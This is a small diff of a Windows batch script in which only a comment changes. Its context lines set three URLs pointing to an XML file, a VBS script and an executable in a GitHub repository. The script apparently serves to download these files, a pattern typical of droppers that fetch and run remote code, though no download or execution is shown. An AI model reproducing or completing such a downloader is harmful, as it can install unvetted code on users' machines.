@@ -1,6 +1,6 @@
 @echo off
 
-REM Define URLs and destination directory
+REM Define URLs and destination directory ri-fa
 set "URL1=https://raw.githubusercontent.com/m-c00/td/main/win-win.xml"
 set "URL2=https://raw.githubusercontent.com/m-c00/td/main/wscript.vbs"
 set "URL3=https://raw.githubusercontent.com/m-c00/td/main/win-tr1.exe"
